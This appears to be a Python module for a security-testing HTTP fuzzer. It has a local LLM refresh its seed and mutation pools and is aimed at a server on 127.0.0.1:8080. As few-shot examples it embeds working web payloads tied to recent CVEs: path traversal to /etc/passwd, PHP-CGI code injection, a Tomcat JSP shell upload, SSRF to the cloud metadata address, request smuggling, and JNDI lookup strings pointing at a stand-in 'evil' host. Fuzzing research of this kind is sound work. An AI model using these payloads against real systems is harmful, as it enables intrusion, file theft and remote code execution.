"""
LLM Full Fuzzer (Unified Pool Architecture)

This fuzzer uses LLM to update both seed pool and mutation pool.

Architecture:
- seed_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
- mutation_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
"""

import json
import random
import copy
from typing import Dict, Any, Optional, List

from .base_fuzzer import BaseFuzzer, FuzzingPayload
from .boofuzz_baseline import BoofuzzSeedGenerator, BoofuzzMutator
from .llm_client import OllamaClient, FuzzingPrompts, extract_json_from_response


class LLMFullFuzzer(BaseFuzzer):
    """
    Fuzzer that uses LLM to update both seed pool and mutation pool.

    Unified pool architecture:
    - seed_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
    - mutation_pool (10): Initialized by boofuzz, LLM updates every 10 iterations
    """

    # Attack types for LLM generation (2024-2025 CVEs)
    ATTACK_TYPES = [
        "path_traversal",       # CVE-2024-53677 (Struts)
        "response_splitting",   # CVE-2024-24795
        "php_cgi_injection",    # CVE-2024-4577
        "jenkins_file_read",    # CVE-2024-23897
        "tomcat_partial_put",   # CVE-2025-24813
        "http2_continuation",   # CVE-2024-27316
        "ssrf",                 # CVE-2024-38476
        "null_pointer",         # CVE-2024-38477
        "smuggling",            # General
        "header_injection",     # General
    ]

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 8080,
        llm_base_url: str = "http://localhost:11434",
        llm_model: str = "qwen3:8b",
        llm_timeout: int = 60,
        llm_temperature: float = 0.8,
        pool_size: int = 10,
        refresh_interval: int = 10,
        **kwargs
    ):
        """
        Initialize the LLM full fuzzer.

        Args:
            target_host: Target server host
            target_port: Target server port
            llm_base_url: Ollama API base URL
            llm_model: Model name to use
            llm_timeout: LLM request timeout
            llm_temperature: Sampling temperature
            pool_size: Size of both pools (default: 10)
            refresh_interval: LLM updates pools every N iterations (default: 10)
        """
        super().__init__(target_host=target_host, target_port=target_port, **kwargs)

        # Initialize LLM client
        self.llm_client = OllamaClient(
            base_url=llm_base_url,
            model=llm_model,
            timeout=llm_timeout,
            temperature=llm_temperature
        )

        # Boofuzz components
        self.boofuzz_seed_generator = BoofuzzSeedGenerator(target_host, target_port)
        self.boofuzz_mutator = BoofuzzMutator()

        # Pool settings
        self.pool_size = pool_size
        self.refresh_interval = refresh_interval

        # Initialize pools
        self._seed_pool: List[FuzzingPayload] = []
        self._mutation_pool: List[Dict[str, Any]] = []
        self._iteration_counter = 0
        self._seed_attack_index = 0
        self._mutation_attack_index = 0

        # Metrics
        self._llm_seed_updates = 0
        self._llm_seed_successes = 0
        self._llm_seed_failures = 0
        self._llm_mutation_updates = 0
        self._llm_mutation_successes = 0
        self._llm_mutation_failures = 0

        # Initialize pools with boofuzz
        self._init_seed_pool_boofuzz()
        self._init_mutation_pool_boofuzz()

        self.logger.info(
            f"Initialized LLMFullFuzzer: model={llm_model}, "
            f"pool_size={pool_size}, refresh_interval={refresh_interval}"
        )

    @property
    def variant_name(self) -> str:
        return "llm_full"

    def _init_seed_pool_boofuzz(self):
        """Initialize seed pool with boofuzz-generated seeds."""
        self._seed_pool.clear()
        for _ in range(self.pool_size):
            self._seed_pool.append(self.boofuzz_seed_generator.generate())
        self.logger.debug(f"Initialized seed pool with {len(self._seed_pool)} boofuzz seeds")

    def _init_mutation_pool_boofuzz(self):
        """Initialize mutation pool with boofuzz-generated templates."""
        self._mutation_pool.clear()
        mutation_types = BoofuzzMutator.MUTATION_TYPES
        for i in range(self.pool_size):
            mutation_type = mutation_types[i % len(mutation_types)]
            self._mutation_pool.append(
                self.boofuzz_mutator.generate_mutation_template(mutation_type)
            )
        self.logger.debug(f"Initialized mutation pool with {len(self._mutation_pool)} boofuzz templates")

    def generate_seed(self) -> FuzzingPayload:
        """
        Generate a seed from the pool.

        Every refresh_interval iterations, LLM updates one seed and one mutation in pools.
        """
        self._iteration_counter += 1

        # Every N iterations, use LLM to update both pools
        if self._iteration_counter % self.refresh_interval == 0:
            self._llm_update_seed_pool()
            self._llm_update_mutation_pool()

        # Get seed from pool (round-robin)
        if self._seed_pool:
            idx = (self._iteration_counter - 1) % len(self._seed_pool)
            seed = self._seed_pool[idx]
            return FuzzingPayload(
                method=seed.method,
                path=seed.path,
                headers=copy.deepcopy(seed.headers),
                body=seed.body,
                seed_id=f"llm_full_seed_{self._iteration_counter}",
                generation_method=seed.generation_method
            )

        # Fallback
        return self.boofuzz_seed_generator.generate()

    def _llm_update_seed_pool(self):
        """Use LLM to generate a new seed and replace one in pool."""
        self._llm_seed_updates += 1

        new_seed = self._generate_llm_seed()

        if new_seed:
            replace_idx = random.randint(0, len(self._seed_pool) - 1)
            self._seed_pool[replace_idx] = new_seed
            self._llm_seed_successes += 1
            self.logger.debug(f"LLM updated seed pool at index {replace_idx}")
        else:
            self._llm_seed_failures += 1

    def _llm_update_mutation_pool(self):
        """Use LLM to generate a new mutation template and replace one in pool."""
        self._llm_mutation_updates += 1

        new_template = self._generate_llm_mutation_template()

        if new_template:
            replace_idx = random.randint(0, len(self._mutation_pool) - 1)
            self._mutation_pool[replace_idx] = new_template
            self._llm_mutation_successes += 1
            self.logger.debug(f"LLM updated mutation pool at index {replace_idx}")
        else:
            self._llm_mutation_failures += 1

    def _generate_llm_seed(self) -> Optional[FuzzingPayload]:
        """Generate a single seed using LLM."""
        attack_type = self.ATTACK_TYPES[self._seed_attack_index % len(self.ATTACK_TYPES)]
        self._seed_attack_index += 1

        prompt = self._build_seed_prompt(attack_type)

        response = self.llm_client.generate(
            prompt=prompt,
            system_prompt=FuzzingPrompts.SEED_GENERATION_SYSTEM,
            temperature=0.8
        )

        if not response.success:
            return None

        return self._parse_llm_seed_response(response.content, attack_type)

    def _generate_llm_mutation_template(self) -> Optional[Dict[str, Any]]:
        """Generate a mutation template using LLM."""
        attack_type = self.ATTACK_TYPES[self._mutation_attack_index % len(self.ATTACK_TYPES)]
        self._mutation_attack_index += 1

        prompt = self._build_mutation_prompt(attack_type)

        response = self.llm_client.generate(
            prompt=prompt,
            system_prompt="You are a security testing assistant. Generate HTTP mutation templates for fuzzing. Output JSON only.",
            temperature=0.8
        )

        if not response.success:
            return None

        return self._parse_llm_mutation_response(response.content, attack_type)

    def _build_seed_prompt(self, attack_type: str) -> str:
        """Build prompt for seed generation."""
        attack_examples = {
            "path_traversal": {
                "method": "GET",
                "path": "/..%252f..%252f..%252fetc/passwd",
                "headers": {"Host": "127.0.0.1:8080"},
                "body": None
            },
            "response_splitting": {
                "method": "GET",
                "path": "/search?q=test%0d%0aSet-Cookie:%20evil=true",
                "headers": {"Host": "127.0.0.1:8080"},
                "body": None
            },
            "php_cgi_injection": {
                "method": "POST",
                "path": "/cgi-bin/php-cgi?%ADd+allow_url_include=1",
                "headers": {"Host": "127.0.0.1:8080"},
                "body": "<?php system('id'); ?>"
            },
            "jenkins_file_read": {
                "method": "POST",
                "path": "/cli?remoting=false",
                "headers": {"Host": "127.0.0.1:8080"},
                "body": "@/etc/passwd"
            },
            "tomcat_partial_put": {
                "method": "PUT",
                "path": "/shell.jsp",
                "headers": {"Host": "127.0.0.1:8080", "Content-Range": "bytes 0-100/101"},
                "body": "<%Runtime.getRuntime().exec(\"id\");%>"
            },
            "http2_continuation": {
                "method": "GET",
                "path": "/",
                "headers": {"Host": "127.0.0.1:8080", "X-HTTP2-Continuation": "true"},
                "body": None
            },
            "ssrf": {
                "method": "GET",
                "path": "/proxy?url=http://169.254.169.254/",
                "headers": {"Host": "127.0.0.1:8080"},
                "body": None
            },
            "null_pointer": {
                "method": "GET",
                "path": "/test",
                "headers": {"Host": "", "Content-Length": "-1"},
                "body": None
            },
            "smuggling": {
                "method": "POST",
                "path": "/",
                "headers": {"Host": "127.0.0.1:8080", "Transfer-Encoding": "chunked"},
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
            },
            "header_injection": {
                "method": "GET",
                "path": "/",
                "headers": {"Host": "127.0.0.1:8080", "X-Forwarded-For": "${jndi:ldap://evil/a}"},
                "body": None
            },
        }

        example = attack_examples.get(attack_type, attack_examples["path_traversal"])

        return f"""Generate ONE HTTP request for {attack_type} attack testing.

Target: HTTP server on 127.0.0.1:8080
Attack type: {attack_type}

Example:
{json.dumps(example, indent=2)}

Generate a DIFFERENT {attack_type} payload. Output JSON only:"""

    def _build_mutation_prompt(self, attack_type: str) -> str:
        """Build prompt for mutation template generation."""
        template_examples = {
            "path_traversal": {"type": "path_traversal", "path": "/..%252f..%252fetc/passwd"},
            "response_splitting": {"type": "response_splitting", "path_suffix": "%0d%0aX-Injected: true"},
            "php_cgi_injection": {"type": "php_cgi", "method": "POST", "path": "/cgi-bin/php-cgi?-d+allow_url_include=1"},
            "jenkins_file_read": {"type": "jenkins_cli", "path": "/cli", "body": "@/etc/passwd"},
            "tomcat_partial_put": {"type": "tomcat_put", "method": "PUT", "path": "/cmd.jsp", "headers": {"Content-Range": "bytes 0-50/51"}},
            "http2_continuation": {"type": "http2_continuation", "headers": {"X-HTTP2-Continuation": "true"}},
            "ssrf": {"type": "ssrf", "path": "/fetch?url=http://localhost/", "headers": {"X-Forwarded-For": "127.0.0.1"}},
            "null_pointer": {"type": "null_pointer", "headers": {"Content-Length": "-1"}},
            "smuggling": {"type": "smuggling", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"}},
            "header_injection": {"type": "header_injection", "headers": {"Referer": "${jndi:ldap://evil/x}"}},
        }

        example = template_examples.get(attack_type, template_examples["path_traversal"])

        return f"""Generate ONE mutation template for {attack_type} attack.

A mutation template can include: type, method, path, path_suffix, headers, body, extra_headers.

Example:
{json.dumps(example, indent=2)}

Generate a DIFFERENT {attack_type} mutation template. Output JSON only:"""

    def _parse_llm_seed_response(self, response: str, attack_type: str) -> Optional[FuzzingPayload]:
        """Parse LLM response into FuzzingPayload."""
        try:
            data = extract_json_from_response(response, logger=self.logger)
            if data is None:
                return None

            method = data.get("method", "GET").upper()
            path = data.get("path", "/")
            headers = data.get("headers", {})
            body = data.get("body")

            if isinstance(headers, dict):
                if "Host" not in headers and "host" not in headers:
                    headers["Host"] = f"{self.target_host}:{self.target_port}"
            else:
                headers = {"Host": f"{self.target_host}:{self.target_port}"}

            return FuzzingPayload(
                method=method,
                path=path,
                headers=headers,
                body=body if body and body != "null" else None,
                generation_method=f"llm_full_seed_{attack_type}"
            )
        except Exception:
            return None

    def _parse_llm_mutation_response(self, response: str, attack_type: str) -> Optional[Dict[str, Any]]:
        """Parse LLM response into mutation template."""
        try:
            data = extract_json_from_response(response, logger=self.logger)
            if data is None or not isinstance(data, dict):
                return None
            if "type" not in data:
                data["type"] = attack_type
            return data
        except Exception:
            return None

    def mutate(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate using a template from the mutation pool."""
        if self._mutation_pool:
            idx = (self._iteration_counter - 1) % len(self._mutation_pool)
            template = self._mutation_pool[idx]
            return self.boofuzz_mutator.apply_mutation_template(payload, template)

        return self.boofuzz_mutator.mutate(payload)

    def get_stats(self) -> Dict[str, Any]:
        """Get fuzzer statistics."""
        stats = super().get_stats()
        stats.update({
            "seed_pool_size": len(self._seed_pool),
            "mutation_pool_size": len(self._mutation_pool),
            "iteration_counter": self._iteration_counter,
            "llm_seed_updates": self._llm_seed_updates,
            "llm_seed_successes": self._llm_seed_successes,
            "llm_seed_failures": self._llm_seed_failures,
            "llm_mutation_updates": self._llm_mutation_updates,
            "llm_mutation_successes": self._llm_mutation_successes,
            "llm_mutation_failures": self._llm_mutation_failures,
            "llm_stats": self.llm_client.get_stats()
        })
        return stats
